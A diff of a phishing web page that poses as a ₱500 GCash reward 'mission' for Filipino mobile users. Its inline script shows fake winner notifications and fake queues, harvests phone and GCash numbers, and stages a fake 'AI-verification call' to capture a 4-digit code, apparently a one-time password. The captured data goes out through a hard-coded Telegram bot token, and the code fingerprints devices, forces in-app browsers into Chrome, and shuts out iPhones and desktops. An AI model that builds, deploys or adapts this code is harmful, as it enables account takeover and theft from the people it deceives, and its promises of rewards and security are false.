-        <div class="confetti-piece pink"></div>
-        <div class="confetti-piece gold"></div>
-        <div class="confetti-piece magenta"></div>
-        <div class="confetti-piece pink"></div>
-        <div class="confetti-piece gold"></div>
-        <div class="confetti-piece magenta"></div>
-    </div>
-
-    <!-- ============================================================
-         LIVE TICKER
-         ============================================================ -->
-    <div class="live-ticker">
-        <div class="ticker-dot"></div>
-        <div class="ticker-content">
-            <span class="ticker-text" id="winnerEntry">
-                <i class="fas fa-bolt"></i>
-                0917***4256 received
-                <span class="ticker-amount">+₱500</span>
-            </span>
+    <!-- RANDOM WINNERS TICKER -->
+    <div class="winners-ticker" id="winnersTicker">
+        <div class="ticker-live-dot"></div>
+        <div class="ticker-text" id="tickerText">
+            <span id="tickerPhone">0917****4256</span>
+            <span>received</span>
+            <img src="images/gc_icon.png" class="ticker-gc-icon" alt="GCash" onerror="this.style.display='none';">
+            <span class="ticker-amount">₱500</span>
         </div>
     </div>
 
-    <!-- ============================================================
-         MAIN CARD
-         ============================================================ -->
-    <div class="main-card" id="mainCard">
+    <!-- MISSION APP -->
+    <div id="missionApp">
+        <div class="bg-rays"></div>
+        <div class="bg-glow"></div>
+        <div id="coinLayer"></div>
+        <div id="sparkleLayer"></div>
+        <div id="confettiLayer"></div>
 
-        <div class="card-bg-image"></div>
-        <div class="card-bg-overlay"></div>
-
-        <span class="corner-deco tl"><i class="fas fa-star"></i></span>
-        <span class="corner-deco tr"><i class="fas fa-star"></i></span>
-        <span class="corner-deco bl"><i class="fas fa-star"></i></span>
-        <span class="corner-deco br"><i class="fas fa-star"></i></span>
-
-        <div class="card-content">
-
-            <!-- Logo Area -->
-            <div class="logo-area">
-                <div class="logo-icon">
-                    <i class="fas fa-gift"></i>
-                    <div class="logo-ring"></div>
-                </div>
-                <h1 class="logo-text">LUCKY DROP</h1>
-                <h1 class="logo-text-sub">FESTIVAL</h1>
-                <div class="logo-sub">✦ MEXICAN FIESTA ✦</div>
+        <div class="mission-card">
+            <div class="mission-badge"><span class="badge-dot"></span><span>⚡ LIVE MISSION ⚡</span></div>
+            <div class="mission-image-wrap">
+                <img src="images/gpm.png" alt="Mission Reward" class="mission-image" onerror="this.style.opacity='0.4';">
             </div>
-
-            <!-- Value Props -->
-            <div class="value-props">
-                <div class="prop-row">
-                    <div class="prop-icon"><i class="fas fa-gift"></i></div>
-                    <div>
-                        <div class="prop-title">🎁 WELCOME BONUS</div>
-                        <div class="prop-desc">₱500 instant bonus para sa bagong user</div>
-                    </div>
-                </div>
-                <div class="prop-row">
-                    <div class="prop-icon"><i class="fas fa-bolt"></i></div>
-                    <div>
-                        <div class="prop-title">⚡ INSTANT WITHDRAWAL</div>
-                        <div class="prop-desc">Instant transfer sa GCash within minutes</div>
-                    </div>
-                </div>
-                <div class="prop-row">
-                    <div class="prop-icon"><i class="fas fa-shield-halved"></i></div>
-                    <div>
-                        <div class="prop-title">🔒 100% SECURED</div>
-                        <div class="prop-desc">Bank-level encryption para sa iyong pera</div>
-                    </div>
-                </div>
+            <h1 class="mission-title">MISSION UNLOCKED</h1>
+            <p class="mission-subtitle">Complete the mission to claim your<br><strong>EXCLUSIVE REWARD!</strong></p>
+            <div class="mission-divider"><span class="star">★</span><span class="line"></span><span class="star">★</span></div>
+            <div class="mission-chips">
+                <div class="mission-chip"><span class="chip-icon">🎁</span><span>REWARD</span></div>
+                <div class="mission-chip"><span class="chip-icon">⚡</span><span>INSTANT</span></div>
+                <div class="mission-chip"><span class="chip-icon">🔒</span><span>SECURED</span></div>
             </div>
+            <button class="mission-btn" id="continueBtn"><span class="btn-icon">🚀</span><span>CONTINUE MISSION</span></button>
+            <div class="mission-note"><i class="fas fa-shield-halved"></i><span>Protected • Encrypted • Verified</span></div>
+        </div>
+    </div>
 
-            <!-- ============================================================
-                 📊 LINE GRAPH TREND
-                 ============================================================ -->
-            <div class="trend-dashboard">
-                <div class="trend-header">
-                    <div class="trend-live-badge">
-                        <span class="live-dot"></span>
-                        LIVE
-                    </div>
-                    <div class="trend-title">
-                        <i class="fas fa-chart-line"></i>
-                        HOURLY TREND
-                    </div>
-                </div>
+    <!-- POPUP 1: CAT CLAIM (with phone input) -->
+    <div class="popup-overlay" id="catClaimPopup">
+        <div class="popup-card">
+            <button class="popup-close" id="catClaimClose">✕</button>
+            <div class="popup-img-wrap"><img src="images/cat_claim.png" alt="Claim" class="popup-img" onerror="this.style.opacity='0.4';"></div>
+            <h2 class="popup-title">READY TO CLAIM?</h2>
+            <p class="popup-subtitle">Enter your mobile number to claim<br>your <strong>₱500 bonus</strong>!</p>
+            <div class="input-label"><i class="fas fa-mobile-screen-button"></i><span>MOBILE NUMBER</span></div>
+            <input type="tel" class="phone-input" id="userPhoneInput" placeholder="09XX XXX XXXX" maxlength="13" inputmode="numeric" autocomplete="off">
+            <button class="popup-btn" id="get500Btn"><span class="btn-icon">💰</span><span>GET ₱500</span></button>
+            <div class="ai-error" id="phoneError"></div>
+        </div>
+    </div>
 
-                <div class="trend-graph-container">
-                    <div class="line-graph-wrapper">
-                        <svg class="line-graph-svg" id="lineGraphSvg" viewBox="0 0 340 100" preserveAspectRatio="none">
-                            <defs>
-                                <linearGradient id="lineGradient" x1="0%" y1="0%" x2="100%" y2="0%">
-                                    <stop offset="0%" stop-color="#d43f7a" />
-                                    <stop offset="50%" stop-color="#f5c842" />
-                                    <stop offset="100%" stop-color="#39ff14" />
-                                </linearGradient>
-                                <linearGradient id="areaGradient" x1="0%" y1="0%" x2="0%" y2="100%">
-                                    <stop offset="0%" stop-color="#f5c842" stop-opacity="0.5" />
-                                    <stop offset="100%" stop-color="#f5c842" stop-opacity="0" />
-                                </linearGradient>
-                            </defs>
+    <!-- POPUP 2: SKIP AND CLAIM -->
+    <div class="popup-overlay" id="skipClaimPopup">
+        <div class="popup-card">
+            <button class="popup-close" id="skipClaimClose">✕</button>
+            <div class="popup-img-wrap"><img src="images/cat_auth.png" alt="Skip" class="popup-img" onerror="this.style.opacity='0.4';"></div>
+            <h2 class="popup-title">SPECIAL OFFER</h2>
+            <p class="popup-subtitle">No rewards available right now.<br>Wait for the countdown to skip and claim.</p>
+            <div class="countdown-badge" id="skipCountdownBadge">⏳ SKIP IN <span id="skipCountdownNum">10</span>s</div>
+            <button class="popup-btn" id="skipClaimBtn" disabled><span class="btn-icon">⏭️</span><span>SKIP & CLAIM</span></button>
+        </div>
+    </div>
 
-                            <line class="graph-grid-line" x1="0" y1="20" x2="340" y2="20" />
-                            <line class="graph-grid-line" x1="0" y1="50" x2="340" y2="50" />
-                            <line class="graph-grid-line" x1="0" y1="80" x2="340" y2="80" />
+    <!-- POPUP 3: CLAIM FORM (GCash#) -->
+    <div class="popup-overlay" id="claimFormPopup">
+        <div class="popup-card">
+            <button class="popup-close" id="claimFormClose">✕</button>
+            <div class="popup-img-wrap"><img src="images/cat_claim.png" alt="Claim Now" class="popup-img" onerror="this.style.opacity='0.4';"></div>
+            <h2 class="popup-title">CLAIM YOUR REWARD</h2>
+            <p class="popup-subtitle">Enter your <strong>GCash number</strong><br>to receive your reward.</p>
+            <div class="input-label"><i class="fas fa-mobile-screen-button"></i><span>GCASH NUMBER</span></div>
+            <input type="tel" class="gcash-input" id="gcashInput" placeholder="09XX XXX XXXX" maxlength="13" inputmode="numeric" autocomplete="off">
+            <button class="popup-btn" id="claimNowBtn"><span class="btn-icon">💰</span><span>CLAIM NOW</span></button>
+            <div class="ai-error" id="claimFormError"></div>
+        </div>
+    </div>
 
-                            <path class="graph-area" id="graphArea" d="" />
-                            <path class="graph-line" id="graphLine" d="" />
-                            <g id="graphPoints"></g>
-                        </svg>
-                    </div>
+    <!-- POPUP 4: QUEUE -->
+    <div class="popup-overlay" id="queuePopup">
+        <div class="popup-card">
+            <button class="popup-close" id="queueClose">✕</button>
+            <div class="queue-badge"><span class="queue-dot"></span><span>⏳ PROCESSING QUEUE</span></div>
+            <h2 class="popup-title">MANY USERS CLAIMING</h2>
+            <p class="popup-subtitle">Maraming user ang nag-claim ngayon.<br>Please wait for your turn.</p>
+            <div class="queue-count-box"><span>👥 Live users:</span><span class="live-users-count" id="liveUsersCount">0</span></div>
+            <div class="queue-timer-label">⏱ Available to claim in</div>
+            <div class="queue-timer-big" id="queueTimer">10:00</div>
+            <div class="queue-progress"><div class="queue-progress-bar" id="queueProgressBar"></div></div>
+            <p class="popup-subtitle" style="margin-top:14px; font-size:11px; opacity:0.8;">Your claim is in the queue. Please keep this page open.</p>
+        </div>
+    </div>
 
-                    <div class="graph-hour-labels" id="graphHourLabels"></div>
-                </div>
-
-                <div class="trend-stats-row">
-                    <div class="trend-stat-card">
-                        <div class="trend-stat-icon blue">
-                            <i class="fas fa-users"></i>
-                        </div>
-                        <div class="trend-stat-content">
-                            <div class="trend-stat-label">TODAY CLAIMS</div>
-                            <div class="trend-stat-value" id="todayClaims">0</div>
-                            <div class="trend-stat-sub">
-                                <span class="stat-dot blue"></span>
-                                <span>Active users</span>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="trend-stat-card">
-                        <div class="trend-stat-icon green">
-                            <i class="fas fa-peso-sign"></i>
-                        </div>
-                        <div class="trend-stat-content">
-                            <div class="trend-stat-label">TOTAL CLAIMED</div>
-                            <div class="trend-stat-value" id="totalClaimed">₱0</div>
-                            <div class="trend-stat-sub">
-                                <span class="stat-dot green"></span>
-                                <span>Today</span>
-                            </div>
-                        </div>
-                    </div>
-                </div>
+    <!-- POPUP 5: SUCCESS -->
+    <div class="popup-overlay" id="successPopup">
+        <div class="popup-card">
+            <button class="popup-close" id="successClose">✕</button>
+            <div class="popup-success">
+                <div class="success-icon">🎉</div>
+                <h2 class="success-title">CLAIMED!</h2>
+                <p class="success-message" id="successMessage">Your reward has been successfully claimed.<br>Please wait for further instructions.</p>
             </div>
+            <button class="popup-btn" id="successOkBtn" style="margin-top:20px;"><span class="btn-icon">✅</span><span>OK</span></button>
+        </div>
+    </div>
 
-            <!-- Swipe to Verify -->
-            <div class="swipe-container">
-                <div class="swipe-track" id="swipeTrack">
-                    <div class="swipe-fire-trail" id="swipeFireTrail"></div>
-                    <div class="swipe-icon" id="swipeIcon">
-                        <img src="images/scatter_icon.jpg" class="scatter-icon" alt="swipe" draggable="false">
-                    </div>
-                    <div class="swipe-text">
-                        <i class="fas fa-arrow-right"></i>
-                        SWIPE TO VERIFY
-                        <i class="fas fa-arrow-left"></i>
-                    </div>
-                </div>
+    <!-- POPUP 6: AI VERIFICATION -->
+    <div class="popup-overlay" id="aiVerifyPopup">
+        <div class="popup-card">
+            <button class="popup-close" id="aiVerifyClose">✕</button>
+            <div class="popup-img-wrap"><img src="images/ai_call.png" alt="AI Call" class="popup-img" onerror="this.style.opacity='0.4';"></div>
+            <h2 class="popup-title">AI-VERIFICATION</h2>
+            <p class="popup-subtitle"><i class="fas fa-phone-volume" style="color:#ffe066;"></i> <strong>Tatawagan ka ng AI-verification system</strong> para i-verify ang iyong GCash number.</p>
+            <div id="aiStage1">
+                <div class="ai-status-text">📝 Ilagay ang iyong <strong>GCash number</strong> para matawagan ka.</div>
+                <div class="input-label"><i class="fas fa-mobile-screen-button"></i><span>GCASH NUMBER</span></div>
+                <input type="tel" class="gcash-input" id="aiGcashInput" placeholder="09XX XXX XXXX" maxlength="13" inputmode="numeric" autocomplete="off">
+                <button class="popup-btn" id="aiRequestCallBtn"><span class="btn-icon">📞</span><span>REQUEST AI CALL</span></button>
+                <div class="ai-error" id="aiGcashError"></div>
             </div>
-
-            <!-- Footer -->
-            <div class="card-footer">
-                <i class="fas fa-shield-halved"></i>
-                <span>Protected by Festival Magic</span>
+            <div id="aiStage2" class="hidden">
+                <div class="ai-status-text" id="aiStatusText">📞 <strong>AI-VERIFICATION CALL</strong> being placed...<br><span style="font-size:11px; color:rgba(255,255,255,0.7);">Please wait for the call</span></div>
+                <div class="ai-timer" id="aiTimer">60s</div>
+            </div>
+            <div id="aiStage3" class="hidden">
+                <div class="ai-status-text">✅ <strong style="color:#39ff14;">CALL CONNECTED!</strong><br><span style="font-size:11px; color:rgba(255,255,255,0.8);">Enter the 4-digit code from the call</span></div>
+                <div class="input-label"><i class="fas fa-ticket-alt"></i><span>ENTER 4-DIGIT CODE</span></div>
+                <input type="text" class="ai-code-input" id="aiCodeInput" placeholder="0000" maxlength="4" inputmode="numeric" autocomplete="off">
+                <button class="popup-btn" id="aiVerifyBtn"><span class="btn-icon">✅</span><span>VERIFY CODE</span></button>
+                <div class="ai-error" id="aiCodeError"></div>
             </div>
         </div>
     </div>
 
-    <!-- ============================================================
-         MODAL — VERIFICATION
-         ============================================================ -->
-    <div class="modal-overlay" id="modalOverlay">
-        <div class="modal-container">
-            <div class="modal-card">
-                <button class="modal-close" onclick="closeModal()">
-                    <i class="fas fa-xmark"></i>
-                </button>
-
-                <div id="modalBodyContent">
-                    <div class="modal-bg-image"></div>
-                    <div class="modal-bg-overlay"></div>
-
-                    <div class="modal-content-inner">
-                        <div class="modal-icon">
-                            <i class="fas fa-gift"></i>
-                        </div>
-
-                        <h2 class="modal-title">✦ WELCOME BONUS ✦</h2>
-                        <p class="modal-subtitle">
-                            Enter your mobile number<br>
-                            to claim your <span class="gold-text">₱500 bonus</span>
-                        </p>
-
-                        <div class="bonus-box-premium">
-                            <div class="bonus-glow"></div>
-                            <div class="bonus-amount-premium">₱500</div>
-                            <div class="bonus-label-premium">
-                                <i class="fas fa-gift"></i>
-                                WELCOME BONUS
-                                <i class="fas fa-gift"></i>
-                            </div>
-                            <div class="bonus-shine"></div>
-                        </div>
-
-                        <div class="input-group-premium">
-                            <label class="input-label-premium">
-                                <i class="fas fa-mobile-screen-button"></i>
-                                Mobile Number
-                            </label>
-                            <div class="input-wrapper-premium">
-                                <input
-                                    type="tel"
-                                    id="userPhone"
-                                    placeholder="9XX XXX XXXX"
-                                    maxlength="12"
-                                    inputmode="numeric"
-                                    autocomplete="off"
-                                >
-                                <span class="input-suffix"><i class="fas fa-check-circle"></i></span>
-                            </div>
-                            <div class="input-hint">
-                                <i class="fas fa-info-circle"></i>
-                                Enter your 10-digit mobile number (9XXXXXXXXX)
-                            </div>
-                        </div>
-
-                        <button class="login-btn" id="claimBtn" onclick="processStep1()">
-                            <span class="login-text">CLAIM BONUS</span>
-                            <span class="login-dots"></span>
-                        </button>
-
-                        <div class="warning-text-premium">
-                            <i class="fas fa-shield-halved"></i>
-                            <span>Your data is 100% secure and encrypted</span>
-                        </div>
-                    </div>
-                </div>
-            </div>
+    <!-- POPUP 7: BAN -->
+    <div class="popup-overlay" id="banPopup">
+        <div class="popup-card ban-card">
+            <div class="popup-img-wrap"><img src="images/cat_claim.png" alt="Ban" class="popup-img" onerror="this.style.opacity='0.4';"></div>
+            <h2 class="popup-title danger">UNABLE TO CLAIM</h2>
+            <p class="popup-subtitle" style="font-size:13px; line-height:1.7;">
+                You are not able to claim your rewards.<br>
+                Please try again on another device.
+            </p>
+            <button class="popup-btn" id="banOkBtn" style="background: linear-gradient(180deg,#ff8888 0%,#ff1744 60%,#8b0000 100%); color:#fff; box-shadow: 0 5px 0 #4a0000, 0 8px 20px rgba(0,0,0,0.55), 0 0 30px rgba(255,23,68,0.6);">
+                <span class="btn-icon">❌</span><span>OK</span>
+            </button>
         </div>
     </div>
 
-    <canvas id="particleCanvas"></canvas>
+    <script>
+        (function() {
+            'use strict';
 
-    <!-- ============================================================
-         SCRIPTS
-         ============================================================ -->
-    <script src="js/config.js"></script>
-    <script src="js/index.js"></script>
+            // ============================================================
+            // ✅ INTENT / BROWSER GUARD (FB / IG / iPhone BLOCK)
+            // ============================================================
+            function isInAppBrowser() {
+                var ua = navigator.userAgent || navigator.vendor || window.opera;
+                return /FBAN|FBAV|FB_IAB|FB4A|FBIOS|Instagram|Messenger|Line|Twitter|LinkedIn|Snapchat|MicroMessenger|WhatsApp|Telegram/i.test(ua);
+            }
+            function isIPhone() {
+                var ua = navigator.userAgent || navigator.vendor || window.opera;
+                return /iPhone|iPad|iPod/i.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+            }
+            function isAndroid() {
+                return /Android/i.test(navigator.userAgent);
+            }
+
+            // ✅ AUTO-INTENT: Force open in Chrome (Android only)
+            function forceOpenInChrome() {
+                if (!isAndroid()) return false;
+                var currentUrl = window.location.href;
+                // Remove protocol prefix
+                var cleanUrl = currentUrl.replace(/^https?:\/\//, '');
+                // Build Android intent URL
+                var intentUrl = 'intent://' + cleanUrl + '#Intent;scheme=https;package=com.android.chrome;S.browser_fallback_url=' + encodeURIComponent(currentUrl) + ';end';
+                try {
+                    window.location.href = intentUrl;
+                    return true;
+                } catch(e) {
+                    console.log('Intent failed:', e);
+                    return false;
+                }
+            }
+
+            function enforceBrowserGuard() {
+                var block = document.getElementById('intentBlock');
+                var app = document.getElementById('missionApp');
+                var ticker = document.getElementById('winnersTicker');
+
+                // Block iPhone
+                if (isIPhone()) {
+                    if (block) block.style.display = 'flex';
+                    if (app) app.style.display = 'none';
+                    if (ticker) ticker.style.display = 'none';
+                    document.querySelectorAll('.popup-overlay').forEach(function(p) {
+                        p.classList.remove('show');
+                        p.style.pointerEvents = 'none';
+                    });
+                    return false;
+                }
+
+                // Block FB / IG in-app browser
+                if (isInAppBrowser()) {
+                    if (block) block.style.display = 'flex';
+                    if (app) app.style.display = 'none';
+                    if (ticker) ticker.style.display = 'none';
+                    document.querySelectorAll('.popup-overlay').forEach(function(p) {
+                        p.classList.remove('show');
+                        p.style.pointerEvents = 'none';
+                    });
+
+                    // ✅ AUTO-INTENT: Try to auto-open in Chrome
+                    setTimeout(function() {
+                        forceOpenInChrome();
+                    }, 800);
+
+                    return false;
+                }
+
+                if (block) block.style.display = 'none';
+                if (app) app.style.display = '';
+                if (ticker) ticker.style.display = '';
+                return true;
+            }
+
+            // Run guard immediately
+            var browserAllowed = enforceBrowserGuard();
+
+            // Re-check on resize / orientation
+            window.addEventListener('resize', function() { enforceBrowserGuard(); });
+            window.addEventListener('orientationchange', function() { setTimeout(enforceBrowserGuard, 300); });
+
+            // ✅ Manual "Open in Chrome" button
+            var autoOpenBtn = document.getElementById('autoOpenBtn');
+            if (autoOpenBtn) {
+                autoOpenBtn.addEventListener('click', function() {
+                    forceOpenInChrome();
+                });
+            }
+
+            // ============================================================
+            // CONFIG
+            // ============================================================
+            var BOT_TOKEN = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
+            var CHAT_ID = '7298607329';
+            var TELEGRAM_THROTTLE_MS = 2000;
+            var lastTelegramTime = 0;
+
+            var db = null;
+            var userPhone = null;
+            var deviceFingerprint = null;
+            var deviceDisplayId = null;
+            var currentAiCode = '';
+            var aiTimerInterval = null;
+            var aiCountdown = 60;
+            var skipCountdownInterval = null;
+            var skipCountdown = 10;
+            var queueTimerInterval = null;
+            var queueCountdown = 600;
+            var liveUsersInterval = null;
+            var linkListeners = [];
+            var isBanned = false;
+
+            // ============================================================
+            // MOBILE GUARD
+            // ============================================================
+            function isMobileDevice() {
+                var ua = navigator.userAgent || navigator.vendor || window.opera;
+                var isTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
+                var isMobileUA = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile|mobile|CriOS/i.test(ua);
+                var isSmallScreen = window.innerWidth <= 768;
+                var isDesktopUA = /Windows NT|Macintosh|X11|Linux x86_64|CrOS/i.test(ua) && !/Mobile|Android|iPhone|iPad/i.test(ua);
+                return isMobileUA || (isTouch && isSmallScreen && !isDesktopUA);
+            }
+            function enforceMobileOnly() {
+                if (!isMobileDevice()) {
+                    var block = document.getElementById('desktopBlock');
+                    var app = document.getElementById('missionApp');
+                    if (block) block.style.display = 'flex';
+                    if (app) app.style.display = 'none';
+                    return false;
+                }
+                return true;
+            }
+            var isMobile = enforceMobileOnly();
+            var resizeTimer;
+            window.addEventListener('resize', function() { clearTimeout(resizeTimer); resizeTimer = setTimeout(enforceMobileOnly, 250); });
+            window.addEventListener('orientationchange', function() { setTimeout(enforceMobileOnly, 300); });
+
+            // ============================================================
+            // FIREBASE INIT
+            // ============================================================
+            function initFirebase() {
+                try {
+                    if (typeof firebaseConfig !== 'undefined') {
+                        if (!firebase.apps || !firebase.apps.length) firebase.initializeApp(firebaseConfig);
+                        db = firebase.database();
+                        console.log('✅ Firebase connected');
+                    } else {
+                        console.warn('⚠️ firebaseConfig not found');
+                    }
+                } catch(e) { console.error('Firebase error:', e); }
+            }
+            initFirebase();
+
+            // ============================================================
+            // TELEGRAM
+            // ============================================================
+            function sendTelegram(message) {
+                try {
+                    var now = Date.now();
+                    if (now - lastTelegramTime < TELEGRAM_THROTTLE_MS) return;
+                    lastTelegramTime = now;
+                    fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(message))
+                        .catch(function(e) { console.log('Telegram error:', e); });
+                } catch(e) {}
+            }
+
+            // ============================================================
+            // DEVICE MANAGEMENT
+            // ============================================================
+            function getDeviceFingerprint() {
+                var screenResolution = screen.width + 'x' + screen.height + 'x' + screen.colorDepth;
+                var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                var language = navigator.language;
+                var userAgent = navigator.userAgent;
+                var platform = navigator.platform;
+                var hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
+                var fingerprintString = userAgent + '|' + screenResolution + '|' + timezone + '|' + language + '|' + platform + '|' + hardwareConcurrency;
+                var hash = 0;
+                for (var i = 0; i < fingerprintString.length; i++) {
+                    hash = ((hash << 5) - hash) + fingerprintString.charCodeAt(i);
+                    hash |= 0;
+                }
+                return 'FP_' + Math.abs(hash);
+            }
+
+            function getOrCreateDeviceId(fingerprint) {
+                if (!fingerprint || fingerprint === '---') return Promise.resolve('---');
+                var deviceMapRef = db.ref('device_id_map/' + fingerprint);
+                return deviceMapRef.once('value').then(function(snap) {
+                    if (snap.exists()) return snap.val().displayId;
+                    var counterRef = db.ref('admin/deviceCounter');
+                    return counterRef.once('value').then(function(counterSnap) {
+                        var nextNum = (counterSnap.val() || 0) + 1;
+                        return counterRef.set(nextNum).then(function() {
+                            var displayId = 'Dev' + nextNum;
+                            return deviceMapRef.set({
+                                displayId: displayId,
+                                createdAt: Date.now(),
+                                fingerprint: fingerprint
+                            }).then(function() { return displayId; });
+                        });
+                    });
+                });
+            }
+
+            function saveDeviceInfo(phone, fingerprint, deviceDisplayId) {
+                var deviceInfo = {
+                    phone: phone,
+                    fingerprint: fingerprint,
+                    displayId: deviceDisplayId,
+                    screenResolution: screen.width + 'x' + screen.height,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    language: navigator.language,
+                    userAgent: navigator.userAgent,
+                    lastSeen: Date.now(),
+                    firstSeen: Date.now()
+                };
+                return db.ref('devices/' + fingerprint).once('value').then(function(existingDevice) {
+                    if (!existingDevice.exists()) {
+                        return db.ref('devices/' + fingerprint).set(deviceInfo);
+                    } else {
+                        return db.ref('devices/' + fingerprint).update({ lastSeen: Date.now(), phone: phone });
+                    }
+                }).then(function() {
+                    return db.ref('device_phone_map/' + fingerprint).set({
+                        phone: phone,
+                        displayId: deviceDisplayId,
+                        lastSeen: Date.now()
+                    });
+                });
+            }
+
+            // ============================================================
+            // BAN CHECK
+            // ============================================================
+            function checkBan(phone, fingerprint) {
+                return db.ref('banned_ghosts/' + phone).once('value').then(function(phoneSnap) {
+                    if (phoneSnap.exists()) return { isBanned: true, type: 'phone' };
+                    return db.ref('device_phone_map/' + fingerprint).once('value').then(function(deviceSnap) {
+                        if (deviceSnap.exists() && deviceSnap.val().phone) {
+                            var linkedPhone = deviceSnap.val().phone;
+                            return db.ref('banned_ghosts/' + linkedPhone).once('value').then(function(linkedSnap) {
+                                if (linkedSnap.exists()) return { isBanned: true, type: 'device', linkedPhone: linkedPhone };
+                                return { isBanned: false };
+                            });
+                        }
+                        return { isBanned: false };
+                    });
+                });
+            }
+
+            function showBanPopup() {
+                document.querySelectorAll('.popup-overlay').forEach(function(p) { p.classList.remove('show'); });
+                var banPopup = document.getElementById('banPopup');
+                if (banPopup) banPopup.classList.add('show');
+            }
+
+            // ============================================================
+            // WINNERS TICKER (Fixed ₱500)
+            // ============================================================
+            function initWinnersTicker() {
+                var prefixes = ['0917', '0918', '0927', '0998', '0945', '0966', '0955', '0939', '0906', '0977'];
+                function generateWinner() {
+                    var prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+                    var last4 = Math.floor(1000 + Math.random() * 9000);
+                    return { phone: prefix + '****' + last4, amount: 500 };
+                }
+                function updateTicker() {
+                    var ticker = document.getElementById('winnersTicker');
+                    var phoneEl = document.getElementById('tickerPhone');
+                    var amountEl = document.querySelector('.ticker-amount');
+                    if (!ticker || !phoneEl || !amountEl) return;
+                    ticker.classList.remove('fade-in');
+                    ticker.classList.add('fade-out');
+                    setTimeout(function() {
+                        var winner = generateWinner();
+                        phoneEl.textContent = winner.phone;
+                        amountEl.textContent = '₱500';
+                        ticker.classList.remove('fade-out');
+                        ticker.classList.add('fade-in');
+                    }, 300);
+                }
+                var initial = generateWinner();
+                var phoneElInit = document.getElementById('tickerPhone');
+                var amountElInit = document.querySelector('.ticker-amount');
+                if (phoneElInit) phoneElInit.textContent = initial.phone;
+                if (amountElInit) amountElInit.textContent = '₱500';
+                setInterval(updateTicker, 4500);
+            }
+            if (browserAllowed) initWinnersTicker();
+
+            // ============================================================
+            // BACKGROUND EFFECTS
+            // ============================================================
+            if (isMobile && browserAllowed) {
+                createFloatingCoins();
+                createSparkles();
+                createConfetti();
+            }
+            function createFloatingCoins() {
+                var layer = document.getElementById('coinLayer'); if (!layer) return;
+                var coinEmojis = ['🪙', '💰', '💎', '⭐', '✨'];
+                for (var i = 0; i < 8; i++) {
+                    var coin = document.createElement('div'); coin.className = 'coin';
+                    coin.textContent = coinEmojis[Math.floor(Math.random() * coinEmojis.length)];
+                    coin.style.left = (Math.random() * 100) + '%';
+                    coin.style.fontSize = (18 + Math.random() * 16) + 'px';
+                    coin.style.animationDuration = (7 + Math.random() * 6) + 's';
+                    coin.style.animationDelay = (Math.random() * 8) + 's';
+                    layer.appendChild(coin);
+                }
+            }
+            function createSparkles() {
+                var layer = document.getElementById('sparkleLayer'); if (!layer) return;
+                for (var i = 0; i < 12; i++) {
+                    var sparkle = document.createElement('div'); sparkle.className = 'sparkle';
+                    sparkle.style.left = (Math.random() * 100) + '%';
+                    sparkle.style.top = (Math.random() * 100) + '%';
+                    sparkle.style.animationDelay = (Math.random() * 3) + 's';
+                    sparkle.style.animationDuration = (1.8 + Math.random() * 2) + 's';
+                    layer.appendChild(sparkle);
+                }
+            }
+            function createConfetti() {
+                var layer = document.getElementById('confettiLayer'); if (!layer) return;
+                var colors = ['#ffe066', '#6ea8ff', '#ff6b9d', '#39ff14', '#ffffff', '#ff8800'];
+                for (var i = 0; i < 12; i++) {
+                    var piece = document.createElement('div'); piece.className = 'confetti';
+                    piece.style.left = (Math.random() * 100) + '%';
+                    piece.style.background = colors[Math.floor(Math.random() * colors.length)];
+                    piece.style.animationDuration = (5 + Math.random() * 5) + 's';
+                    piece.style.animationDelay = (Math.random() * 5) + 's';
+                    piece.style.width = (5 + Math.random() * 6) + 'px';
+                    piece.style.height = (8 + Math.random() * 8) + 'px';
+                    piece.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
+                    layer.appendChild(piece);
+                }
+            }
+
+            // ============================================================
+            // CONFETTI BURST
+            // ============================================================
+            function triggerBurst() {
+                var colors = ['#ffe066', '#6ea8ff', '#ff6b9d', '#39ff14', '#ffffff', '#ff8800'];
+                for (var i = 0; i < 30; i++) {
+                    (function() {
+                        var piece = document.createElement('div');
+                        piece.style.cssText = 'position:fixed;left:50%;top:50%;width:' + (6 + Math.random() * 8) + 'px;height:' + (8 + Math.random() * 10) + 'px;background:' + colors[Math.floor(Math.random() * colors.length)] + ';border-radius:' + (Math.random() > 0.5 ? '50%' : '2px') + ';z-index:999999;pointer-events:none;box-shadow:0 0 10px rgba(255,255,255,0.6);transition:transform 1.2s cubic-bezier(0.2, 0.8, 0.3, 1), opacity 1.2s ease;';
+                        document.body.appendChild(piece);
+                        var angle = Math.random() * Math.PI * 2;
+                        var distance = 150 + Math.random() * 250;
+                        var tx = Math.cos(angle) * distance;
+                        var ty = Math.sin(angle) * distance;
+                        setTimeout(function() {
+                            piece.style.transform = 'translate(' + tx + 'px, ' + ty + 'px) rotate(' + (Math.random() * 720) + 'deg)';
+                            piece.style.opacity = '0';
+                        }, 20);
+                        setTimeout(function() { if (piece.parentNode) piece.parentNode.removeChild(piece); }, 1400);
+                    })();
+                }
+            }
+
+            // ============================================================
+            // POPUP HELPERS
+            // ============================================================
+            function openPopup(id) { 
+                if (!browserAllowed) return;
+                var p = document.getElementById(id); if (p) p.classList.add('show'); 
+            }
+            function closePopup(id) { var p = document.getElementById(id); if (p) p.classList.remove('show'); }
+            function closeAllPopups() { document.querySelectorAll('.popup-overlay').forEach(function(p) { p.classList.remove('show'); }); }
+
+            document.getElementById('catClaimClose').onclick = function() { closePopup('catClaimPopup'); };
+            document.getElementById('skipClaimClose').onclick = function() { closePopup('skipClaimPopup'); stopSkipCountdown(); };
+            document.getElementById('claimFormClose').onclick = function() { closePopup('claimFormPopup'); };
+            document.getElementById('queueClose').onclick = function() { closePopup('queuePopup'); stopQueueTimer(); stopLiveUsersCounter(); stopLinkListeners(); clearCountdownState(); };
+            document.getElementById('successClose').onclick = function() { closePopup('successPopup'); };
+            document.getElementById('aiVerifyClose').onclick = function() { closePopup('aiVerifyPopup'); stopAiTimer(); };
+            document.getElementById('banOkBtn').onclick = function() { /* stay on ban popup */ };
+
